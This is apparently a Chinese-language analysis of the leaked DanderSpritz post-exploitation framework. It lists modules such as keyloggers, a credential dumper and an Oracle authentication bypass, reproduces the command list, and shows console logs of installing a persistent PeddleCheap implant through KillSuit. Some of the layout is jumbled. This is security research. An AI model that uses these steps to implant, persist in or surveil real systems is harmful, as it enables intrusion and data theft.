Check!!! =================================================================== 
Running command 'python windows\checkpsp.py -project Ops ' 
- Checking for any running known PSP's... 
-  
- Checking for target PSP history... 
- No target history found. 
- I don't see any known PSP's running. 
- Checking for a change in configuration 
    Command completed successfully 
- [2022-04-06 16:35:37 z0.0.0.12] ================================ Auditing 
dorking ================================================================ 
- [2022-04-06 16:35:37 z0.0.0.12] Data age: 13 seconds (from local cache, re-
run manually if you need to) 
- [2022-04-06 16:35:37 z0.0.0.12] Auditing is not enabled on this machine 
- [2022-04-06 16:35:37 z0.0.0.12] Auditing is already off, no need to dork 
- [2022-04-06 16:35:38 z0.0.0.12] ==================================== 
Monitors ==================================================================== 
     Monitors 
根据提示信息Dsz_Implant_Pc.dll木有直接传输整个文件，而是传输了Sending
Payload to remote side 137488 bytes)。不知道是压缩的效果，还是其它原
因。
上面就是最简单的Beacon上线流程。亮点在于python脚本支持下的任务列表。
根据johnbergbom的分析PeddleCheap，也是RSA的密钥协商，在协商过程中传输了公钥。
模块列表
在System页面的About下，可以看到加载的模块列表。
DeMi 2.1.1
2.1.1.0
DmGz 2.1.3
2.1.3.0
DSky 3.0.1
3.0.1.0
DSZ 1.3.0 Patch 1
1.3.0.0
DSZ 1.3.0 Patch 2
1.3.0.0
DSZ 1.3.0 Patch 3
1.3.0.0
DSZ 1.3.0
1.3.0.0
ExpandingPulley_base-win323.2.2.1
3.2.null.2
ExpandingPulley_plugins-win323.2.2.1
3.2.null.2
FlAv 3.2.0.3
3.2.0.3
PaperCut 2.1.0.5
2.1.0.5
PC 2.3.0 Patch 1
2.3.0.0
PC 2.3.0 Patch 2
2.3.0.0
PeddleCheap 2.3.0
2.3.0.0
Pc 2.2.0 Patch 1
2.2.0.0
Pc 2.2.0 Patch 2
2.2.0.0
Pc 2.2.0 Patch 3
2.2.0.0
PeddleCheap 2.2.0.2
2.2.0.2
PassFreely 3.3.1.1
3.3.1.1
ScRe 2.0.2
2.0.2.1
DszTasking 2.2.1.1
2.2.1.1
DeMi 2.1.1
2.1.1.0
UtBu 1.0.2
1.0.2.0
ZBng 3.4.0
3.4.0.0
Java Runtime
1.8.0_41
代码涉及的模块比较多，为了方便后续的分析，先根据文件夹名称整理一个表格，方便记忆。
短名
代码名
说明
DSky
Darkskyline
抓包工具
DaPu
DarkPulsar
PeddleCheap的前任
DeMI
DecibelMinute
KillSuit管理器
Df
DoubleFeature
报表生成器
DmGZ
DoormanGauze
内核网络驱动，绕过系统TCP堆栈（与dewdrop的bspfilter是不是一
途？）
Dsz
DanderSpritz
DanderSpritz的相关文件
Ep
ExpandingPulley
DanderSpritz的前任
FlAv
FlewAvenue
DoormanGauze相关 (based on FlAv/scripts/_FlewAvenue.txt)
GRDO
GreaterDoctor
GreaterSurgeon的数据分析 (based on
GRDO/Tools/i386/GreaterSurgeon_postProcess.py & analyzeM
GROK
??
键盘记录器(based on Ops/PyScripts/overseer/plugins/keylogge
GRcl
??
进程内存dump(based on
GRcl/Commands/CommandLine/ProcessMemory_Command.xm
GaTh
GangsterTheif
持久化数据分析 (based on
GaTh/Commands/CommandLine/GrDo_ProcessScanner_Comm
GeZU
GreaterSurgeon
内存Dump (based on
GeZu/Commands/CommandLine/GeZu_KernelMemory_Comma
Pfree
Passfreely
Oracle 认证绕过
PaCU
PaperCut
操作其它进程文件句柄
Pc
PeddleCheap
监听程序，与Beacon进行交互
ScRe
??
SQL查询 (based on
ScRe/Commands/CommandLine/Sql_Command.xml)
StLa
Strangeland
键盘记录器(based on StLa/Tools/i386-winnt/strangeland.xsl)
短名
代码名
说明
TeDi
TerritorialDispute
检查是否可以持久化 (based on TeDi/PyScripts/sigs.py)
Utbu
UtilityBurst
安装驱动模块(based on UtBu/Scripts/Include/_UtilityBurstFunct
ZBng
ZippyBang
NSA版本的Mimikatz. (based on files in
ZBng/Commands/CommandLine)
DanderSpritz GUI
在命令行界面，这里需要Python 2.7的版本，才能正常工作，执行下面的命令，就启动了管理客
户端，同时也启动了C2的服务端。
或者直接运行Jar文件。
在GUI的Terminal界面内，有一个Python的终端，可以执行pc_prep，或者pc2.2_prep，就可以
生成Beacon。
然后启动PeddleCheap下的监听程序，就可以接收Beacon的反向连接。
在Terminals终端里面，看看有哪些命令。
python start_lp.py 
java -jar start.jar 
help 
[00:59:42] ID: 472 'help' started [target: z0.0.0.12] 
Prefixes: 
  async            background       disablewow64     foreground       guiflag 
  local            log              src              stopaliasing     task 
  dst              user             wait             xml              
nocharescapes 
  framework        disablepre       disablepost 
Commands: 
  activedirectory        activity               addresses              
aliases 
  appcompat              appcompat_uninstall    arp                    audit 
  authentication         available              banner                 break 
  cd                     commands               copy                   cprpc 
  currentusers           database               delete                 
devicequery 
  dir                    diskspace              dllload                
dmgz_control 
  dns                    domaincontroller       drivers                drives 
  duplicatetoken         environment            eventlogclear          
eventlogedit 
  eventlogfilter         eventlogquery          fileattributes         
filetype 
  firewall               flav_control           freeplugin             
frzaddress 
  frzlinks               frzroutes              frzsecassocs           
frztimeouts 
  gangsterthief          generatedata           get                    
getadmin 
  gezu_kernelmemory      grdo_filescanner       grdo_processscanner    grep 
  groups                 gui                    handles                help 
  hide                   ifconfig               injectdll              
keepalive 
  kill                   kisu_addmodule         kisu_config            
kisu_connect 
  kisu_deletemodule      kisu_disconnect        kisu_freedriver        
kisu_freemodule 
  kisu_fulllist          kisu_install           kisu_list              
kisu_loaddriver 
  kisu_loadmodule        kisu_processload       kisu_readmodule        
kisu_survey 
  kisu_uninstall         kisu_upgrade           language               ldap 
  library                loadplugin             logedit                
logonasuser 
  lpdirectory            lpgetenv               lpsetenv               
matchfiletimes 
  memory                 mkdir                  moduletoggle           move 
  nameserverlookup       netbios                netconnections         netmap 
  objects                oracle                 packages               
packetredirect 
  papercut               passworddump           pc_connect             
pc_listen 
  pc_status              performance            permissions            ping 
  plugins                policy                 portmap                
processes 
  processinfo            processmemory          processmodify          
processoptions 
  processsuspend         put                    pwd                    python 
  quitanddelete          redirect               registryadd            
registrydelete 
  registryhive           registryquery          remoteexecute          rmdir 
  route                  run                    runaschild             
这里面的命令都是分类成组使用，下面开始分析。
KillSuit
KillSuit又名GreyFish，是进行后渗透的模块。这里的操作，都是在获得一个连接的基础上进行，
比如采用DoublePlusar或者EternelBlue等漏洞完成。
kisu模块由多个命令组成。
支持多种方式的渗透系统，进行持久化，数据窃取。
scheduler 
  script                 serialredirect         services               shares 
  shutdown               sidlookup              sql                    stop 
  strings                systempaths            systemversion          
throttle 
  time                   traceroute             trafficcapture         uptime 
  users                  version                warn                   whoami 
  windows                wrappers               xmlparser 
- Loaded commands have a '*' preceeding the command name 
For additional information try: help  
    Command completed successfully 
  kisu_addmodule         kisu_config            kisu_connect 
  kisu_deletemodule      kisu_disconnect        kisu_freedriver        
kisu_freemodule 
  kisu_fulllist          kisu_install           kisu_list              
kisu_loaddriver 
  kisu_loadmodule        kisu_processload       kisu_readmodule        
kisu_survey 
  kisu_uninstall         kisu_upgrade 
![Dsz_pc_connnect_2022-04-15_08-42-04](imgs/Dsz_pc_connnect_2022-04-15_08-42-
04.png)kisu_survey  
[07:19:15] ID: 514 'kisu_survey' started [target: z0.0.0.11] 
Module 122 already loaded (addr=z0.0.0.11) - Load count 8 
Module loaded 
Loading module 305 (addr=z0.0.0.11 | type=dsz | file=DiBa_Target.dll) 
Module loaded 
Persistence methods: 
然后执行pc_install，安装到目标系统。
          Type : DRIVER 
    Compatible : true 
        Reason :  
          Type : SOTI 
    Compatible : true 
        Reason :  
          Type : JUVI 
    Compatible : false 
        Reason : OS not supported by JUVI 
    Command completed successfully 
07:35:27>> kisu_install -type pc 
[07:35:27] ID: 517 'kisu_install' started [target: z0.0.0.11] 
- Installing 0x7a43e1fa 
KISU instance 0x7a43e1fa (PC) installed successfully 
    Command completed successfully 
07:36:53>> kisu_connect -type pc 
[07:36:53] ID: 519 'kisu_connect' started [target: z0.0.0.11] 
Loading module 316 (addr=z0.0.0.11 | type=dsz | file=KisuComms_Target.dll) 
Module loaded 
Comms established to KISU instance 0x7a43e1fa (PC) version 2.4.3.1 
    Command completed successfully 
00:51:52>> kisu_list 
[00:51:52] ID: 767 'kisu_list' started [target: z0.0.0.14] 
Loading module 316 (addr=z0.0.0.14 | type=dsz | file=KisuComms_Target.dll) 
Module loaded 
   Id         Version    Name 
================================ 
0x7a43e1fa    2.4.3.1    PC 
    Command completed successfully 
00:47:13>> pc_install  
[00:47:13] ID: 762 'script' started [target: z0.0.0.14] 
-  
-  
- Pc Install 
-  
- Current Configuration: 
生成Payload，最后安装。安装成功后，就实现了持久化。
为了验证已经成功持久化，重启目标机。
目标机重启完成后，使用PC，连接目标机。记得选择Level4的第一个1167。其它木有测试。
-      Load Method : AppCompat 
-     Process Name : lsass.exe 
-       COMMS Type : Winsock 
-     Trigger Name : ntfltmgr 
-          Payload : None 
-  KiSu Connection : Not connected 
-  
-  0) Exit 
-  
- Configuration 
-  1) Change load method 
-  2) Change trigger driver name 
-  3) Change process name 
-  
- KiSu Connection 
-  4) Connect to PC's KiSu 
-  5) Install PC's KiSu 
-  
- Payload 
-  6) Prepare a new payload 
-  7) Pick an existing payload 
-  
- Actions 